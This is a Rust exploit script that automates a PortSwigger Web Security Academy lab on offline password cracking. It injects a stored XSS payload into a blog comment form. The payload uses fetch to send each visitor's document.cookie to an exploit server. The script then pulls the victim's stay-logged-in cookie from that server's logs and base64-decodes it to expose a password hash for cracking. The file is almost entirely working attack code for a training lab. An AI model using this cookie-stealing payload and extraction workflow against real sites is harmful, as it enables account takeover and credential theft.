/****************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 30/8/2023
*
* Lab: Offline password cracking
*
* Steps: 1. Exploit XSS vulnerability in comment functionlity
*        2. Extract victim cookie from the exploit server logs
*        3. Decode the cookie to get the hashed password
*        4. Crack the hash to get the plain password
*
*****************************************************************/
#![allow(unused)]
#![feature(ascii_char)]
/***********
* Imports
***********/
use base64::{self, Engine};
use lazy_static::lazy_static;
use regex::{self, Regex};
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    fs::{self, OpenOptions},
    hash::Hash,
    io::{self, Write},
    ops::Add,
    rc::Rc,
    sync::{
        atomic::{AtomicUsize, Ordering},
        Mutex,
    },
    thread,
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let lab_url = "https://0a65002d04b3bcf283f910fa001b0060.web-security-academy.net";

    // change this to your exploit server URL
    let exploit_server_url = "https://exploit-0a5a001a048bbc3883090f7601bd0005.exploit-server.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // capture the time before enumeration
    let start_time = time::Instant::now();

    // put an XSS payload in a comment
    let is_exploited = exploit_xss_in_comment_functionality(&client, lab_url, exploit_server_url);

    // if you injected XSS successfully
    if is_exploited {
        // try to extract the cookie from the your server logs
        let cookie = extract_cookie_from_logs(&client, exploit_server_url);

        // if you found the cookie
        if let Some(encoded) = cookie {
            // decrypt the cookie
            let decoded = decode_cookie(encoded);

            // get the hash and exclude the name
            let hash = decoded.split(":").nth(1).unwrap();

            println!(
                "{}: {}",
                "✅ Password hash".yellow().bold(),
                hash.green().bold()
            );
            println!(
                "{}",
                "Crack this hash using any online hash cracker"
                    .white()
                    .bold()
            );
        } else {
            println!("{}", "No cookies found")
        }
    }
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/******************************************************
* Function used to inject XSS in comment functionality
*******************************************************/
fn exploit_xss_in_comment_functionality(
    client: &Client,
    lab_url: &str,
    exploit_server_url: &str,
) -> bool {
    // put the payload in a comment
    let exploit_xss = client.post(&format!("{lab_url}/post/comment")).form(&HashMap::from(
       [ ("postId", "2"),
        ("comment",
        &format!("<script>fetch('{exploit_server_url}/exploit?cookie=' + document.cookie)</script/> Exploited!")
         ),
        ("name", "Hacker"),
        ("email", "hacker@hacker.me"),
        ("website", "")]
    )).send();

    // if the comment is added successfully
    if let Ok(res) = exploit_xss {
        println!(
            "{}",
            "1. Exploit XSS in comment functionality.. OK"
                .white()
                .bold()
        );
        true
    } else {
        false
    }
}

/*****************************************************************
* Function used to extract the cookie from the exploit sever logs
******************************************************************/
fn extract_cookie_from_logs(client: &Client, exploit_server_url: &str) -> Option<String> {
    // define the pattern used in extracting the cookie
    let pattern = Regex::new("stay-logged-in=(.*) HTTP").unwrap();

    // fetch the logs
    let logs = client.get(format!("{exploit_server_url}/log")).send();

    // if fetching logs is successful
    if let Ok(res) = logs {
        // try to extarct the cookie
        let body = res.text().unwrap();
        let cookie = pattern.captures(&body);
        
        // if extracting is OK
        if let Some(text) = cookie {
            let encoded = text.get(1).unwrap().as_str().to_string();
            println!(
                "{}",
                "2. Get stay-logged-in cookie of the victim from exploit sever logs.. OK"
                    .white()
                    .bold()
            );
            return Some(encoded);
        } else {
            None
        }
    } else {
        println!("{}", "[!] Failed to get logs through exception");
        None
    }
}

/**********************************************
* Function used to decode the extracted cookie
***********************************************/
fn decode_cookie(cookie: String) -> String {
    println!("{}", "3. Decoding the encrypted cookie.. OK".white().bold());
    base64::engine::general_purpose::STANDARD_NO_PAD
        .decode(cookie)
        .unwrap()
        .as_ascii()
        .unwrap()
        .as_str()
        .to_string()
}
